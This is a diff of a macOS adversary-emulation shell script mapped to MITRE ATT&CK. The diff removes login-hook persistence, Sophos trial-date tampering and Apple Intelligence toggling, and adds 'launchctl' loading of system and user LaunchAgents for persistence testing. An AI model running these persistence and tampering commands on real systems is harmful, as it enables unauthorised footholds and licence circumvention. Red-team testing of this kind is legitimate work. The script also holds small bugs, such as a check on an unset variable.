@@ -1,14 +1,14 @@
 #!/bin/sh
 # POSIX-compliant
-# Procedure Name: modify_preferences
+# Procedure Name: launchctl
 # Tactic: Persistence
-# Technique: T1547
-# GUID: 3b366584-63de-4b56-87fa-46eb2dd0f1e5
-# Intent: Establish persistence by modifying system login preferences and extending application trial periods using defaults write commands
-# Author: @darmado | https://x.com/darmad0
-# created: 2025-01-27
+# Technique: T1543.001
+# GUID: 09b9fa1f-45b8-4ea7-90d7-46477b6094c8
+# Intent: Load or demonstrate LaunchAgents via launchctl for persistence-style testing. Lab-only; sudo paths require explicit operator consent.
+# Author: Josh Carullo
+# created: 2023-05-27
 # Updated: 2026-05-03
-# Version: 1.0.9
+# Version: 1.2.4
 # License: Apache 2.0
 
 # Core function Info:
@@ -20,7 +20,7 @@
 NAME="" 
 # MITRE ATT&CK Mappings
 TACTIC="Persistence" #replace with you coresponding tactic
-TTP_ID="T1547" #replace with you coresponding ttp_id
+TTP_ID="T1543.001" #replace with you coresponding ttp_id
 
 TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
 TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
@@ -92,22 +92,19 @@ CMD_WC="wc"
 CMD_CAT="cat"
 CMD_LSOF="lsof"
 
-INPUT_LOGIN_HOOK=""
-LOGIN_HOOK=false
-EXTEND_SOPHOS=false
-AI_MANIPULATION=false
-CHECK_PERSISTENCE=false
+LOAD_SYSTEM_PLIST=false
+LOAD_USER_AGENT=false
+INPUT_PLIST_PATH=""
 
-CMD_DEFAULTS="defaults"
+CMD_LAUNCHCTL="/bin/launchctl"
 CMD_SUDO="sudo"
-DEFAULT_HOOK_PATH="/tmp/gain_persistence.sh"
-SOPHOS_TRIAL_DATE="2026-05-30 08:46:00 +0000"
+INPUT_PLIST_PATH=""
 
 # Project root path (set by build system)
 PROJECT_ROOT="/Users/darmado/Desktop/attack-macOS"  # Set by build system to project root directory
 
 # Procedure Information (set by build system)
-PROCEDURE_NAME="modify_preferences"  # Set by build system from YAML procedure_name field
+PROCEDURE_NAME="launchctl"  # Set by build system from YAML procedure_name field
 
 # Function execution tracking
 FUNCTION_LANG=""  # Ued by log_output at execution time
@@ -649,26 +646,22 @@ core_parse_args() {
                 SACRIFICIAL_CHILD=true
                 ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
-        --login-hook)
+        --load-system-plist)
+            LOAD_SYSTEM_PLIST=true
+            ;;
+        --load-user-agent)
+            LOAD_USER_AGENT=true
+            ;;
+        --plist-path)
             if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                 MISSING_VALUES="$MISSING_VALUES $1"
             elif [ -n "$2" ]; then
-                INPUT_LOGIN_HOOK="$2"
-                LOGIN_HOOK=true
+                INPUT_PLIST_PATH="$2"
                     shift
             else
                 MISSING_VALUES="$MISSING_VALUES $1"
                 fi
                 ;;
-        --extend-sophos)
-            EXTEND_SOPHOS=true
-            ;;
-        --ai-manipulation)
-            AI_MANIPULATION=true
-            ;;
-        --check-persistence)
-            CHECK_PERSISTENCE=true
-            ;;
             *)
                 # Collect unknown arguments for error reporting
                 if [ -z "$UNKNOWN_ARGS" ]; then
@@ -707,10 +700,9 @@ HELP:
   -d, --debug                   Enable debug output (includes verbose output)
 
 SCRIPT:
-  --login-hook VALUE               Set login hook for persistence
-  --extend-sophos                  Extend Sophos trial cache date
-  --ai-manipulation                Manipulate Apple Intelligence settings
-  --check-persistence              Check current persistence mechanisms
+  --load-system-plist              sudo launchctl load system LaunchAgent plist (LAB ONLY — destructive)
+  --load-user-agent                launchctl load -w user LaunchAgents plist (path via --plist-path)
+  --plist-path FILE_PATH           Path to plist for --load-user-agent
 
 EXECUTION:
   --sacrificial-pid             Run main logic in a child shell; parent reads child stdout from a FIFO under
@@ -2105,36 +2097,27 @@ execute_function() {
     $func_name
 }
 
-# Execute functions for --login-hook
-if [ "$LOGIN_HOOK" = true ]; then
-    core_debug_print "Executing functions for --login-hook"
-    result=$(execute_function set_login_hook)
+# Execute functions for --load-system-plist
+if [ "$LOAD_SYSTEM_PLIST" = true ]; then
+    core_debug_print "Executing functions for --load-system-plist"
+    result=$(execute_function launchctl_load_system_plist_example)
     raw_output="${raw_output}${result}"
 fi
 
-# Execute functions for --extend-sophos
-if [ "$EXTEND_SOPHOS" = true ]; then
-    core_debug_print "Executing functions for --extend-sophos"
-    result=$(execute_function extend_sophos_trial)
+# Execute functions for --load-user-agent
+if [ "$LOAD_USER_AGENT" = true ]; then
+    core_debug_print "Executing functions for --load-user-agent"
+    result=$(execute_function launchctl_load_user_agent)
     raw_output="${raw_output}${result}"
 fi
 
-# Execute functions for --ai-manipulation
-if [ "$AI_MANIPULATION" = true ]; then
-    core_debug_print "Executing functions for --ai-manipulation"
-    result=$(execute_function manipulate_ai_settings)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --check-persistence
-if [ "$CHECK_PERSISTENCE" = true ]; then
-    core_debug_print "Executing functions for --check-persistence"
-    result=$(execute_function check_persistence_status)
-    raw_output="${raw_output}${result}"
+# Execute functions for --plist-path
+if [ "$PLIST_PATH" = true ]; then
+    core_debug_print "Executing functions for --plist-path"
 fi
 
 # Set procedure name for processing
-procedure="modify_preferences"
+procedure="launchctl"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -2301,105 +2284,48 @@ core_generate_encryption_key() {
 process_input_arguments() {
     # Process and validate input arguments based on their types
     
-    # Process --login-hook argument
-    if [ -n "${INPUT_LOGIN_HOOK}" ]; then
+    # Process --plist-path argument
+    if [ -n "${INPUT_PLIST_PATH}" ]; then
         # Process string input
-        LOGIN_HOOK_ARG="${INPUT_LOGIN_HOOK}"
+        PLIST_PATH_ARG="${INPUT_PLIST_PATH}"
     fi
 }
 
 
-# Function: set_login_hook
+# Function: launchctl_load_system_plist_example
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-set_login_hook() {
-    $CMD_PRINTF "PERSISTENCE_TYPE|COMMAND|RESULT\n"
-    
-    # Use provided path or default
-    local hook_path="${INPUT_LOGIN_HOOK:-$DEFAULT_HOOK_PATH}"
-    
-    # Set login hook
+launchctl_load_system_plist_example() {
+    $CMD_PRINTF "WARN|launchctl|sudo load example references /Library/LaunchAgents/com.apple.installer — replace plist in YAML for your lab\n"
     local result
-    result=$($CMD_SUDO $CMD_DEFAULTS write /Library/Preferences/com.apple.loginwindow LoginHook "$hook_path" 2>&1)
-    $CMD_PRINTF "LOGIN_HOOK|sudo defaults write /Library/Preferences/com.apple.loginwindow LoginHook|%s\n" "$result"
-    
+    result=$("$CMD_SUDO" "$CMD_LAUNCHCTL" load /Library/LaunchAgents/com.apple.installer 2>&1) || true
+    $CMD_PRINTF "LAUNCHCTL|mode|sudo_system_load|stdout_stderr|%s\n" "$result"
     return 0
 }
 
 
-# Function: extend_sophos_trial
+# Function: launchctl_load_user_agent
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-extend_sophos_trial() {
-    $CMD_PRINTF "PERSISTENCE_TYPE|COMMAND|RESULT\n"
-    
-    # Read current Sophos trial date
-    local current_date
-    current_date=$($CMD_DEFAULTS read com.sophos.ipm cacheDate 2>/dev/null)
-    $CMD_PRINTF "SOPHOS_CURRENT|defaults read com.sophos.ipm cacheDate|%s\n" "$current_date"
-    
-    # Extend Sophos trial cache date
+launchctl_load_user_agent() {
+    if [ -z "$INPUT_PLIST_PATH" ]; then
+        $CMD_PRINTF "ERROR|launchctl|--load-user-agent requires --plist-path\n"
+        return 1
+    fi
+    if [ ! -f "$INPUT_PLIST_PATH" ]; then
+        $CMD_PRINTF "ERROR|launchctl|plist not found|%s\n" "$INPUT_PLIST_PATH"
+        return 1
+    fi
     local result
-    result=$($CMD_DEFAULTS write com.sophos.ipm cacheDate "$SOPHOS_TRIAL_DATE" 2>&1)
-    $CMD_PRINTF "SOPHOS_EXTEND|defaults write com.sophos.ipm cacheDate|%s\n" "$result"
-    
-    return 0
-}
-
-
-# Function: manipulate_ai_settings
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-manipulate_ai_settings() {
-    $CMD_PRINTF "PERSISTENCE_TYPE|COMMAND|RESULT\n"
-    
-    # Disable Apple Intelligence
-    local disable_result
-    disable_result=$($CMD_DEFAULTS write com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool false 2>&1)
-    $CMD_PRINTF "AI_DISABLE|defaults write com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool false|%s\n" "$disable_result"
-    
-    # Enable Apple Intelligence
-    local enable_result
-    enable_result=$($CMD_DEFAULTS write com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool true 2>&1)
-    $CMD_PRINTF "AI_ENABLE|defaults write com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool true|%s\n" "$enable_result"
-    
-    return 0
-}
-
-
-# Function: check_persistence_status
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-check_persistence_status() {
-    $CMD_PRINTF "PERSISTENCE_TYPE|COMMAND|RESULT\n"
-    
-    # Check login hook
-    local login_hook
-    login_hook=$($CMD_SUDO $CMD_DEFAULTS read /Library/Preferences/com.apple.loginwindow LoginHook 2>/dev/null)
-    $CMD_PRINTF "LOGIN_HOOK_CHECK|sudo defaults read /Library/Preferences/com.apple.loginwindow LoginHook|%s\n" "$login_hook"
-    
-    # Check Sophos trial date
-    local sophos_date
-    sophos_date=$($CMD_DEFAULTS read com.sophos.ipm cacheDate 2>/dev/null)
-    $CMD_PRINTF "SOPHOS_DATE_CHECK|defaults read com.sophos.ipm cacheDate|%s\n" "$sophos_date"
-    
-    # Check AI settings
-    local ai_setting
-    ai_setting=$($CMD_DEFAULTS read com.apple.CloudSubscriptionFeatures.optIn 545129924 2>/dev/null)
-    $CMD_PRINTF "AI_SETTING_CHECK|defaults read com.apple.CloudSubscriptionFeatures.optIn 545129924|%s\n" "$ai_setting"
-    
+    result=$("$CMD_LAUNCHCTL" load -w "$INPUT_PLIST_PATH" 2>&1) || true
+    $CMD_PRINTF "LAUNCHCTL|mode|user_load_w|plist|%s\n" "$INPUT_PLIST_PATH"
+    $CMD_PRINTF "LAUNCHCTL|stdout_stderr|%s\n" "$result"
     return 0
 }
 
